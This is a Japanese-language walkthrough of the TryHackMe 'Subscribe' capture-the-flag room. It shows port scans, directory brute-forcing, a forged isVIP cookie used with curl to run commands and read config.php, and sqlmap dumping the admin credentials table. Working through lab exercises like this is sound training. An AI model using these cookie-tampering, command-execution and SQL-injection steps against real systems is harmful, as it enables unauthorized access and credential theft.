# TryHack3M: Subscribe CTF

https://tryhackme.com/room/subscribe

## Enumeration

```shell
TARGET=10.10.68.235
sudo bash -c "echo $TARGET   hackme.thm >> /etc/hosts"
```

### ポートスキャン

```sh
rustscan -a $TARGET

Open 10.10.68.235:22
Open 10.10.68.235:80
Open 10.10.68.235:8000
Open 10.10.68.235:8089
Open 10.10.68.235:8191
Open 10.10.68.235:40009
[~] Starting Script(s)
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-24 16:24 JST
Initiating Ping Scan at 16:24
Scanning 10.10.68.235 [4 ports]
Completed Ping Scan at 16:24, 0.28s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 16:24
Scanning hackme.thm (10.10.68.235) [6 ports]
Discovered open port 8000/tcp on 10.10.68.235
Discovered open port 8089/tcp on 10.10.68.235
Discovered open port 22/tcp on 10.10.68.235
Discovered open port 8191/tcp on 10.10.68.235
Discovered open port 40009/tcp on 10.10.68.235
Discovered open port 80/tcp on 10.10.68.235
Completed SYN Stealth Scan at 16:24, 0.29s elapsed (6 total ports)
Nmap scan report for hackme.thm (10.10.68.235)
Host is up, received echo-reply ttl 61 (0.26s latency).
Scanned at 2025-06-24 16:24:10 JST for 0s

PORT      STATE SERVICE        REASON
22/tcp    open  ssh            syn-ack ttl 61
80/tcp    open  http           syn-ack ttl 61
8000/tcp  open  http-alt       syn-ack ttl 61
8089/tcp  open  unknown        syn-ack ttl 61
8191/tcp  open  limnerpressure syn-ack ttl 61
40009/tcp open  unknown        syn-ack ttl 61

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
           Raw packets sent: 10 (416B) | Rcvd: 7 (292B)
```

```shell
sudo nmap -sV -p22,80,8000,8089,8191,40009 $TARGET

root@ip-10-10-0-121:~# sudo nmap -sV -p22,80,8000,8089,8191,40009 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-06-24 08:25 BST
Nmap scan report for hackme.thm (10.10.68.235)
Host is up (0.00036s latency).

PORT      STATE SERVICE         VERSION
22/tcp    open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http            Apache httpd 2.4.41 ((Ubuntu))
8000/tcp  open  http            Splunkd httpd
8089/tcp  open  ssl/http        Splunkd httpd (free license; remote login disabled)
8191/tcp  open  limnerpressure?
40009/tcp open  http            Apache httpd 2.4.41
```

8000 は Splunk で、なにも入れなくても admin でログインできている状態。  
Task3 Detection のクイズは、Splunk の操作方法さえ知っていれば迷う要素はない。  
問題は Task2。

8191 ポートに Web アクセスしたら、MongoDB 関連。

```
It looks like you are trying to access MongoDB over HTTP on the native driver port.
```

40009 ポートは Forbidden。

### gobuster

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -x=txt,php -u http://hackme.thm -w ./dirlist.txt -t 30 -k

===============================================================
/connection.php       (Status: 200) [Size: 0]
/config.php           (Status: 200) [Size: 0]
/css                  (Status: 301) [Size: 306] [--> http://hackme.thm/css/]
/dashboard.php        (Status: 302) [Size: 0] [--> login.php]
/favicon.ico          (Status: 200) [Size: 15086]
/img                  (Status: 301) [Size: 306] [--> http://hackme.thm/img/]
/index.php            (Status: 200) [Size: 4499]
/javascript           (Status: 301) [Size: 313] [--> http://hackme.thm/javascript/]
/js                   (Status: 301) [Size: 305] [--> http://hackme.thm/js/]
/login.php            (Status: 200) [Size: 2875]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/phpmyadmin           (Status: 301) [Size: 313] [--> http://hackme.thm/phpmyadmin/]
/sign_up.php          (Status: 200) [Size: 2761]
/subscribe.php        (Status: 302) [Size: 0] [--> login.php]
===============================================================
```

Burp の Target を見ると、気になる js があった。

js/invite.js

```js
function e() {
  var e = window.location.hostname;
  if (e === "capture3millionsubscribers.thm") {
    var o = new XMLHttpRequest();
    o.open("POST", "inviteCode1337HM.php", true);
    o.onload = function () {
      if (this.status == 200) {
        console.log("Invite Code:", this.responseText);
      } else {
        console.error("Error fetching invite code.");
      }
    };
    o.send();
  } else if (e === "hackme.thm") {
    console.log("This function does not operate on hackme.thm");
  } else {
    console.log("Lol!! Are you smart enought to get the invite code?");
  }
}
```

ブラウザで http://capture3millionsubscribers.thm/sign_up.php を表示し、ブラウザの js コンソールで、

```
e();
```

を実行すると、Invite Code が返ってきた。

```
Invite Code: [REDACTED]
```

そのコードを入れてボタンを押すと、下記表示。

```
Awesome, you did it! Your username and password are guest@hackme.thm:[REDACTED]
```

Burp の Target を見ると、いつの間にか次のような PHP をリクエストしていた。たぶん、Cookie を操作して有料ページを見たときだと思われる。

BBF813FA941496FCE961EBA46D754FF3.php

```js
$(document).ready(function () {
  $("#shell_commands").on("keydown", function (event) {
    if (event.which == 13) {
      // Hackme.thm emulator capable of exeuting following commands:
      // - run  <machine AMI>
      // - whoami "returns username"
      // - ls "list the files"
      // -  cat <filename> "list contents of files accessed jointly by dev and prod team"
      var cmd = $("#shell_commands").val();
      $.get("run_machine_hackme.php", { command: cmd }, function (data) {
        var output = data;
        var output = decodeHtmlEntities(data);
        $("#shell_output").text(output);
      }).fail(function () {
        $("#shell_output").text("Error executing command.");
      });

      $("#shell_commands").val("");
    }
  });
});

function decodeHtmlEntities(str) {
  return str
    .replace(/&lt;/g, "<")
    .replace(/&gt;/g, ">")
    .replace(/&quot;/g, '"')
    .replace(/&amp;/g, "&");
  // Extend with other entities as needed
}
```

これを使ってコマンド実行が可能。ただし、ホワイトリストで明示的に書かれたコマンドのみなので、やれることは限られる。

```sh
$ curl -H "Cookie: PHPSESSID=fpcckmi0lojvnavkepc446t2bj; isVIP=true" http://capture3millionsubscribers.thm/run_machine_hackme.php?command=whoami
www-data
```

config.php

```sh
$ curl -H "Cookie: PHPSESSID=fpcckmi0lojvnavkepc446t2bj; isVIP=true" http://capture3millionsubscribers.thm/run_machine_hackme.php?command=cat%20config.php
&lt;?php

$SECURE_TOKEN= &quot;[REDACTED]&quot;;
$urlAdminPanel= &quot;http://admin1337special.hackme.thm:40009&quot;;
?&gt;
```

http://admin1337special.hackme.thm:40009/public/html/login.php  
を試したら、Auth Code を入れる画面が出てきた。  
これに入手したセキュアトークンを入れるとログイン画面が出てきた。

で、先に Splunk の調査（Task3）をやっていたので、ここに SQLi の脆弱性があるであろうことはすぐに分かった。  
一度 POST を発行し、Burp でリクエストをテキスト保存し、sqlmap。

DBs

```sh
sqlmap -r ./login.txt --dbs -batch

available databases [6]:
[*] hackme
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] sys
```

Tables

```sh
sqlmap -r ./login.txt -D hackme --tables -batch

[2 tables]
+--------+
| config |
| users  |
+--------+
```

All

```sh
sqlmap -r ./login.txt -D hackme --dump-all -batch

Table: config
[1 entry]
+----+--------+---------+
| id | title  | value   |
+----+--------+---------+
| 1  | signup | invite  |
+----+--------+---------+

Table: users
[1 entry]
+----+------------------+------------+--------+----------+--------------+----------+
| id | email            | name       | role   | status   | password     | username |
+----+------------------+------------+--------+----------+--------------+----------+
| 1  | admin@hackme.thm | Admin User | admin  | 1        | [REDACTED] | admin    |
+----+------------------+------------+--------+----------+--------------+----------+
```

この認証情報でログインし、Signup を有効にして 80 ポートにアクセスすると、ゲームセット。

## 振り返り

- Burp の Target を見るといつの間にか重要なリクエストが出ていたというパターンを最初から最後まで何度も繰り返した印象。
- $urlAdminPanel の値のままでは Forbidden になるところが微妙に意地が悪いと思った。
- Splunk は非常に簡単だった。それだけ習熟したと言えるかもしれない。
